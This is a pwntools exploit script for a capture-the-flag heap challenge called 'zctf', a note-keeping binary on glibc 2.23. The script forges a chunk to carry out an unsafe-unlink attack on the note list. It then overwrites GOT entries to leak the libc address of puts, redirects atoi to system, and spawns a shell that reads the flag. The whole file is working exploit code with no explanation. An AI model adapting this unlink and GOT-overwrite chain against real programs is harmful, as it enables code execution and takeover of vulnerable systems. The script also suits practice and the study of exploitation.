from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
p = process('./zctf')
# p = remote('node4.buuoj.cn', 29415)
elf = ELF('./zctf')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def add(size_, mess):
    p.recvuntil(b'option--->>')
    p.sendline(b'1')
    p.recvuntil(b'Input the length of the note content:(less than 1024)')
    p.sendline(size_)
    p.recvuntil(b'Input the note content:')
    p.sendline(mess)


def show(id_):
    p.recvuntil(b'option--->>')
    p.sendline(b'2')
    p.recvuntil(b'Input the id of the note:')
    p.sendline(id_)


def edit(id_, mess):
    p.recvuntil(b'option--->>')
    p.sendline(b'3')
    p.recvuntil(b'Input the id of the note:')
    p.sendline(id_)
    p.recvuntil(b'Input the new content:')
    p.sendline(mess)


def delete(id_):
    p.recvuntil(b'option--->>')
    p.sendline(b'4')
    p.recvuntil(b'Input the id of the note:')
    p.sendline(id_)


chunk_list = 0x6020d8
payload = b'a' * 0x10
add(b'128', payload)
payload = b'a' * 0x10
add(b'128', payload)
payload = p64(0) + p64(0xa1) + p64(chunk_list - 0x18) + p64(chunk_list - 0x10)
add(b'128', payload)
payload = b'a' * 0x10
add(b'0', payload)
payload = b'a' * 0x10
add(b'128', payload)

delete(b'3')
payload = b'a' * 0x10 + p64(0xa0) + p64(0x90)
add(b'0', payload)
delete(b'4')
puts_got = elf.got['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_addr = elf.sym['puts']
payload = b'a' * 0x8 + p64(free_got) + p64(puts_got) + p64(0x6020c0)
edit(b'2', payload)
payload = p64(puts_addr)[:-1]
edit(b'0', payload)
delete(b'1')
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print(hex(puts_addr))
system_addr = puts_addr - lib.symbols['puts'] + lib.symbols['system']
atoi_got = elf.got['atoi']
payload = b'a' * 0x8 + p64(atoi_got) + p64(puts_got)
edit(b'2', payload)
payload = p64(system_addr) + p64(0x4007e6)
edit(b'0', payload)
p.sendline(b'/bin/sh')
sleep(1)
p.sendline(b'cat flag')
p.interactive()
